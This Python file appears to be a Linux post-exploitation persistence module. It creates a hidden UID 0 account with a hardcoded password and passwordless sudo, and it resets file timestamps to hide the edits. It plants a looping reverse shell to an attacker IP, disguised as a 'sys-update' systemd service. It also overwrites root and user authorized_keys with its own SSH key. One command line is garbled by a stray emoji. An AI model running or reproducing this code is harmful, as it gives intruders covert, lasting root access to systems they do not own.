import os
import sys
import subprocess
import time
import argparse
import json
from datetime import datetime
from pathlib import Path
import select
from modules.logger import logger
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import ipaddress
import getpass

# Configuration
HIDDEN_USERNAME = "rootkeepers"
PASSWORD = "rootkeeprs5"
UID_GID = 0
SHELL = "/bin/bash"
HOME_DIR = "/root"
OUTPUT_FILE = "/tmp/keep3rs.json"
HIDDEN_DIR = "/usr/local/.config"
PAYLOAD_PATH = f"{HIDDEN_DIR}/.sys_update.sh"
SERVICE_PATH = "/etc/systemd/system/sys-update.service"
CRON_JOB = f"@reboot {PAYLOAD_PATH}"
TARGET_USERS = ["root", os.getenv("SUDO_USER") or os.getenv("USER")]

class PersistenceLogger:
    def __init__(self):
        self.output_file = Path(OUTPUT_FILE)
        self.log_data = {
            "persistence_mechanisms": {
                "hidden_account": {},
                "reverse_shell": {},
                "cron_jobs": {},
                "systemd_services": {},
                "ssh_keys": {}
            },
            "execution_metadata": {
                "start_time": None,
                "end_time": None,
                "status": "unknown"
            }
        }

    def __enter__(self):
        self.log_data["execution_metadata"]["start_time"] = datetime.now().isoformat()
        sys.stdout = self
        sys.stderr = self
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stdout = sys.__stdout__
        sys.stderr = sys.__stderr__
        self.log_data["execution_metadata"]["end_time"] = datetime.now().isoformat()
        self.log_data["execution_metadata"]["status"] = "success" if not exc_type else "error"
        self._save_output()

    def write(self, text):
        sys.__stdout__.write(text)

    def flush(self):
        sys.__stdout__.flush()

    def _save_output(self):
        try:
            existing_data = {}
            if self.output_file.exists():
                with open(self.output_file, 'r') as f:
                    try:
                        existing_data = json.load(f)
                    except json.JSONDecodeError:
                        existing_data = {}

            # Merge new persistence data while preserving existing structure
            if "persistence" in existing_data:
                existing_data["persistence"].update(self.log_data)
            else:
                existing_data["persistence"] = self.log_data

            with open(self.output_file, 'w') as f:
                json.dump(existing_data, f, indent=2, default=str)
        except Exception as e:
            sys.__stdout__.write(f"\n[-] Failed to save output: {str(e)}\n")

def check_sudo(root_proc):
    cmd = "whoami\n"
    root_proc.stdin.write(cmd)
    root_proc.stdin.flush()
    time.sleep(0.1)
    ready, _, _ = select.select([root_proc.stdout], [], [], 2.0)
    if ready:
        user = root_proc.stdout.readline().strip()
        if user != "root":
            logger.error("Error: This script requires root privileges.")
            return False
        return True
    else:
        logger.error("Error: Could not verify root privileges.")
        return False

def execute_step(description, func, root_proc, *args, **kwargs):
    logger.info(f"[*] Executing: {description}")
    try:
        result = func(root_proc, *args, **kwargs)
        logger.info(f"[+] Success: {description}")
        return result
    except Exception as e:
        logger.error(f"[-] Error in {description}: {str(e)}")
        raise

def cleanup_previous_install(root_proc):
    logger.info("[*] Cleaning up previous installations")
    commands = [
        f"systemctl stop sys-update.service 2>/dev/null",
        f"systemctl disable sys-update.service 2>/dev/null",
        f"rm -f {SERVICE_PATH} 2>/dev/null",
        f"systemctl daemon-reload 2>/dev/null",
        f"systemctl reset-failed sys-update.service 2>/dev/null",
        f"crontab -l | grep -v '{CRON_JOB}' | crontab -",
        f"pkill -f {PAYLOAD_PATH} 2>/dev/null",
        f"rm -rf {HIDDEN_DIR} 2>/dev/null"
    ]
    for cmd in commands:
        root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(0.1)
        while root_proc.stdout in select.select([root_proc.stdout], [], [], 0.1)[0]:
            root_proc.stdout.readline()
    logger.info("[+] Cleanup completed")

def create_root_account(root_proc):
    file_times = {
        "/etc/passwd": get_file_mtime(root_proc, "/etc/passwd"),
        "/etc/shadow": get_file_mtime(root_proc, "/etc/shadow"),
        "/etc/sudoers": get_file_mtime(root_proc, "/etc/sudoers"),
        "/etc/group": get_file_mtime(root_proc, "/etc/group")
    }
    commands = [
        f"echo '{HIDDEN_USERNAME}:x:{UID_GID}:{UID_GID}:Sudo Service Account:{HOME_DIR}:{SHELL}' >> /etc/passwd",
        f"sed -i '/^sudo:x:/s/$/,{HIDDEN_USERNAME}/' /etc/group",
        f"echo '\n# Built-in sudo configuration\n{HIDDEN_USERNAME} ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers",
        f"echo '{HIDDEN_USERNAME}:{PASSWORD}' | chpasswd"
    ]
    for cmd in commands:
        root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(0.1)
        while root_proc.stdout in select.select([root_proc.stdout], [], [], 0.1)[0]:
            root_proc.stdout.readline()
        while root_proc.stderr in select.select([root_proc.stderr], [], [], 0.1)[0]:
            logger.error(f"Error from command: {root_proc.stderr.readline().strip()}")

    for path, mtime in file_times.items():
        set_file_mtime(root_proc, path, mtime)

    logger.info(f"[+] Root account {HIDDEN_USERNAME} created successfully")
    logger.info(f"[+] Password: {PASSWORD}")

    if hasattr(sys.stdout, 'log_data'):
        sys.stdout.log_data["persistence_mechanisms"]["hidden_account"] = {
            "username": HIDDEN_USERNAME,
            "password": PASSWORD,
            "uid": UID_GID,
            "shell": SHELL,
            "home_dir": HOME_DIR
        }

def create_root_account_manual(root_proc):

    username = input("Enter new root-level username: ").strip()
    password = getpass.getpass("Enter password for new user: ").strip()

    file_times = {
        "/etc/passwd": get_file_mtime(root_proc, "/etc/passwd"),
        "/etc/shadow": get_file_mtime(root_proc, "/etc/shadow"),
        "/etc/sudoers": get_file_mtime(root_proc, "/etc/sudoers"),
        "/etc/group": get_file_mtime(root_proc, "/etc/group")
    }

    home_dir = f"/home/{username}"
    shell = "/bin/bash"
    uid_gid = "0"  # root privileges

    commands = [
        f"echo '{username}❌{uid_gid}:{uid_gid}:Sudo Service Account:{home_dir}:{shell}' >> /etc/passwd",
        f"sed -i '/^sudo❌/s/$/,{username}/' /etc/group",
        f"echo '\n# Built-in sudo configuration\n{username} ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers",
        f"echo '{username}:{password}' | chpasswd"
    ]

    for cmd in commands:
        root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(0.1)
        while root_proc.stdout in select.select([root_proc.stdout], [], [], 0.1)[0]:
            root_proc.stdout.readline()
        while root_proc.stderr in select.select([root_proc.stderr], [], [], 0.1)[0]:
            logger.error(f"Error from command: {root_proc.stderr.readline().strip()}")

    for path, mtime in file_times.items():
        set_file_mtime(root_proc, path, mtime)

    logger.info(f"[+] Root account {username} created successfully")
    logger.info(f"[+] Password: {password}")

    if hasattr(sys.stdout, 'log_data'):
        sys.stdout.log_data["persistence_mechanisms"]["manual_hidden_account"] = {
            "username": username,
            "password": password,
            "uid": uid_gid,
            "shell": shell,
            "home_dir": home_dir
        }

def get_file_mtime(root_proc, filepath):
    cmd = f"stat -c %Y '{filepath}'\n"
    root_proc.stdin.write(cmd)
    root_proc.stdin.flush()
    time.sleep(0.1)
    ready, _, _ = select.select([root_proc.stdout], [], [], 2.0)
    if ready:
        return float(root_proc.stdout.readline().strip())
    return None

def set_file_mtime(root_proc, filepath, mtime):
    if mtime is not None:
        cmd = f"touch -d '@{int(mtime)}' '{filepath}'\n"
        root_proc.stdin.write(cmd)
        root_proc.stdin.flush()
        time.sleep(0.1)
        while root_proc.stdout in select.select([root_proc.stdout], [], [], 0.1)[0]:
            root_proc.stdout.readline()

def create_hidden_dir(root_proc):
    cmd = f"mkdir -p '{HIDDEN_DIR}' && chmod 700 '{HIDDEN_DIR}'\n"
    root_proc.stdin.write(cmd)
    root_proc.stdin.flush()
    time.sleep(0.1)
    while root_proc.stdout in select.select([root_proc.stdout], [], [], 0.1)[0]:
        root_proc.stdout.readline()
    logger.debug(f"[~]Hidden Directory path:{HIDDEN_DIR}")

def write_payload(root_proc, ip, port):
    payload = f"""#!/bin/bash
while true; do
    sleep 10
    bash -i >& /dev/tcp/{ip}/{port} 0>&1
done
"""
    cmd = f"echo '{payload}' > '{PAYLOAD_PATH}' && chmod 700 '{PAYLOAD_PATH}'\n"
    root_proc.stdin.write(cmd)
    root_proc.stdin.flush()
    time.sleep(0.1)
    while root_proc.stdout in select.select([root_proc.stdout], [], [], 0.1)[0]:
        root_proc.stdout.readline()

    if hasattr(sys.stdout, 'log_data'):
        sys.stdout.log_data["persistence_mechanisms"]["reverse_shell"] = {
            "ip": ip,
            "port": port,
            "hidden_directory": HIDDEN_DIR,
            "payload_path": PAYLOAD_PATH,
            "payload": payload,
            "execution_methods": ["cron", "systemd"]
        }
    logger.debug(f"[~]Payload Path: {PAYLOAD_PATH}")
    logger.debug(f"Payload : {payload}")

def add_persistence(root_proc):
    cron_cmd = "crontab -l\n"
    root_proc.stdin.write(cron_cmd)
    root_proc.stdin.flush()
    time.sleep(0.1)

    cron_content_lines = []
    while True:
        ready, _, _ = select.select([root_proc.stdout], [], [], 1.0)
        if ready:
            try:
                line = root_proc.stdout.readline()
                if line:
                    cron_content_lines.append(line.strip())
                else:
                    break
            except ValueError:
                logger.error("Error reading line from stdout (crontab -l)")
                break
        else:
            break

    cron_content = "\n".join(cron_content_lines)

    service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={PAYLOAD_PATH}
Restart=always
User=root

[Install]
WantedBy=multi-user.target"""

    commands = [
        f"echo '{service_content}' > '{SERVICE_PATH}'",
        f"chmod 644 '{SERVICE_PATH}'",
        f"systemctl daemon-reload",
        f"systemctl enable sys-update.service",
        f"systemctl start sys-update.service"
    ]
    for cmd in commands:
        root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(1)
        while root_proc.stdout in select.select([root_proc.stdout], [], [], 1)[0]:
            root_proc.stdout.readline()

    service_status_cmd = "systemctl is-active sys-update.service\n"
    root_proc.stdin.write(service_status_cmd)
    root_proc.stdin.flush()
    time.sleep(1)
    service_status = ""
    ready, _, _ = select.select([root_proc.stdout], [], [], 5.0)
    if ready:
        service_status = root_proc.stdout.readline().strip()

    if hasattr(sys.stdout, 'log_data'):
        rs = sys.stdout.log_data["persistence_mechanisms"]["reverse_shell"]
        rs.update({
                    "cron_job": CRON_JOB,
                    "service_path": SERVICE_PATH,
                    "systemd_service": service_content
        })
    logger.debug(f"[~]Cronjob: {CRON_JOB}")
    logger.debug(f"[~]Service Path: {SERVICE_PATH}")
    logger.debug(f"[~]Service: {service_content}")

def generate_ssh_key(root_proc):
    try:
        key= rsa.generate_private_key(public_exponent=65537, key_size=4096)
        private_pem = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()

        public_pem= key.public_key().public_bytes(
            encoding=serialization.Encoding.OpenSSH,
            format=serialization.PublicFormat.OpenSSH
        ).decode()
        
        logger.info(f"[+] Generated SSH Private key: \n {private_pem.strip()}")
        logger.debug(f"[~] Generated SSH Public Key: \n {public_pem.strip()}")
        sys.stdout.log_data["persistence_mechanisms"]["ssh_keys"]["Private_key"] = private_pem.strip()
        return public_pem.strip()
    except Exception as e:
        logger.error(f"Error generating SSH keys: {e}")
        raise



def deploy_key(root_proc, public_key):
    deployed_users = []
    for user in TARGET_USERS:
        homedir = "/root" if user == "root" else f"/home/{user}"
        ssh_dir = f"{homedir}/.ssh"
        auth_file = f"{ssh_dir}/authorized_keys"

        for cmd in (
            f"mkdir -p {ssh_dir}",
            f"chown {user}:{user} {ssh_dir}",
            f"chmod 700 {ssh_dir}"
        ):
            root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(5)

        overwrite_cmds = [
            f"echo '{public_key}' > {auth_file}",
            f"chown {user}:{user} {auth_file}",
            f"chmod 600 {auth_file}"
        ]
        for cmd in overwrite_cmds:
            root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(5)

        deployed_users.append(user)

    if hasattr(sys.stdout, 'log_data'):
        sys.stdout.log_data["persistence_mechanisms"]["ssh_keys"]["deployed_to"] = deployed_users
        sys.stdout.log_data["persistence_mechanisms"]["ssh_keys"]["status"] = "success"

def start_ssh_service(root_proc):
    commands = [
        "sudo systemctl enable --now ssh 2>/dev/null",
        "sudo service ssh start 2>/dev/null"
    ]
    for cmd in commands:
        root_proc.stdin.write(cmd + "\n")
        root_proc.stdin.flush()
        time.sleep(5)
        while root_proc.stdout in select.select([root_proc.stdout], [], [], 5)[0]:
            root_proc.stdout.readline()

def execute_persistence(root_proc, manual_mode=False):
    with PersistenceLogger():  # Context manager wraps entire operation
        if not check_sudo(root_proc):
            return

        if manual_mode:
            logger.info("\n=== Manual Persistence Configuration ===")
            execute_step("Cleaning up previous installations", cleanup_previous_install, root_proc)
            choice = input("[+] Set up Root Account Backdoor (Y/N): ").strip().lower()
            while choice not in ("y", "n", "yes", "no"):
                choice = input("Please enter Y or N: ").strip().lower()

            if choice in ("y", "yes"):
                logger.info("[+] Setting up Root Account Backdoor")
                execute_step("Creating hidden root account", create_root_account_manual, root_proc)
            else:
                logger.info("[*] Skipping Root Account Backdoor setup")

            choice2 = input("[+] Set up Reverse Shell ? (Y/N): ").strip().lower()
            while choice2 not in ("y", "n", "yes", "no"):
                choice2 = input("Please enter Y or N: ").strip().lower()

            if choice2 in ("y", "yes"):
                while True:
                    print("\n>>> Enter attacker IP: ", flush=True)
                    ready, _, _ = select.select([sys.stdin], [], [], 15.0)
                    if not ready:
                        logger.error("Error: No attacker IP provided.")
                        continue
                    
                    ATTACKER_IP = sys.stdin.readline().strip()
                    logger.debug(f"[~]Received attacker IP: {ATTACKER_IP}")
                    try:
                        ipaddress.ip_address(ATTACKER_IP)
                        break
                    except ValueError:
                        logger.error("Error: Invalid IP address format.")

                print("\n>>> Enter attacker PORT: ", flush=True)
                ready, _, _ = select.select([sys.stdin], [], [], 15.0)
                if ready:
                    try:
                        ATTACKER_PORT = int(sys.stdin.readline().strip())
                        logger.debug(f"[~]Received attacker PORT: {ATTACKER_PORT}")
                        if not (1 <= ATTACKER_PORT <= 65535):
                            raise ValueError
                    except ValueError:
                        logger.error("Error: Invalid attacker port provided.")
                        return
                else:
                    logger.error("Error: No attacker PORT provided.")
                    return
                
                logger.info("[+] Enable Reverse Shell Persistence (Systemd/Cron)")
                execute_step("Creating hidden directory", create_hidden_dir, root_proc)
                execute_step("Writing payload script", write_payload, root_proc, ATTACKER_IP, ATTACKER_PORT)
                execute_step("Configuring persistence mechanism", add_persistence, root_proc)
            else:
                logger.info("[*] Skipping Reverse Shell setup")

            choice3 = input("[+] Set up SSH Persistence ? (Y/N): ").strip().lower()
            while choice3 not in ("y", "n", "yes", "no"):
                choice3 = input("Please enter Y or N: ").strip().lower()

            if choice3 in ("y", "yes"):
                public_key = execute_step("Generating SSH keys", generate_ssh_key, root_proc)
                if public_key:
                    execute_step("Deploying SSH keys", deploy_key, root_proc, public_key)
                    execute_step("Starting SSH service", start_ssh_service, root_proc)
            else:
                logger.info("[*] Skipping SSH Persistence setup")
            
            logger.info("\n[+] Manual persistence configuration completed")

        else:
            logger.info("\n=== Running Automatic Persistence Setup ===")
            execute_step("Cleaning up previous installations", cleanup_previous_install, root_proc)
            execute_step("Creating hidden root account", create_root_account, root_proc)
            
            print("\n>>> Enter attacker IP: ", flush=True)
            ready, _, _ = select.select([sys.stdin], [], [], 15.0)
            if ready:
                ATTACKER_IP = sys.stdin.readline().strip()
                logger.debug(f"[~]Received attacker IP: {ATTACKER_IP}")
                try:
                    ipaddress.ip_address(ATTACKER_IP)
                except ValueError:
                    logger.error("Error: Invalid IP address format.")
                    return
            else:
                logger.error("Error: No attacker IP provided.")
                return

            print("\n>>> Enter attacker PORT: ", flush=True)
            ready, _, _ = select.select([sys.stdin], [], [], 15.0)
            if ready:
                try:
                    ATTACKER_PORT = int(sys.stdin.readline().strip())
                    if 1 <= ATTACKER_PORT <= 65535:
                        logger.debug(f"[~]Received attacker PORT: {ATTACKER_PORT}")
                    else:
                        logger.error("Error: Attacker port must be between 1 and 65535.")
                        return None

                except ValueError:
                    logger.error("Error: Invalid attacker port provided.")
                    return
            else:
                logger.error("Error: No attacker PORT provided.")
                return

            execute_step("Creating hidden directory", create_hidden_dir, root_proc)
            execute_step("Writing payload script", write_payload, root_proc, ATTACKER_IP, ATTACKER_PORT)
            execute_step("Configuring persistence mechanism", add_persistence, root_proc)

            public_key = execute_step("Generating SSH keys", generate_ssh_key, root_proc)
            if public_key:
                execute_step("Deploying SSH keys", deploy_key, root_proc, public_key)
                execute_step("Starting SSH service", start_ssh_service, root_proc)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-m', '--manual', action='store_true')
    args = parser.parse_args()

    try:
        with open("/tmp/keep3rs.json", "r") as f:
            data = json.load(f)
    except FileNotFoundError:
        logger.error("Error: /tmp/keep3rs.json not found.")
        sys.exit(1)
    except json.JSONDecodeError:
        logger.error("Error: Could not decode JSON from /tmp/keep3rs.json.")
        sys.exit(1)

    persist_cfg = data.get("persistence", {})

    if persist_cfg.get("requested"):
        logger.info(f"[+] Persistence requested; invoking persistence module")
        expl = persist_cfg.get("exploit_command")
        if expl:
            try:
                root_proc = subprocess.Popen(
                    expl,
                    shell=True,
                    executable="/bin/bash",
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                    bufsize=1,
                    start_new_session=True
                )
                time.sleep(1)
                execute_persistence(root_proc, manual_mode=args.manual)
                root_proc.stdin.close()
                root_proc.stdout.close()
                root_proc.stderr.close()
                root_proc.wait(timeout=5)
            except FileNotFoundError:
                logger.error(f"Error: Command not found: {expl}")
            except Exception as e:
                logger.error(f"Error executing exploit command: {e}")
        else:
            logger.error("Error: 'exploit_command' not found in persistence configuration.")
    else:
        logger.info("[*] No persistence requested—skipping persistence module.")
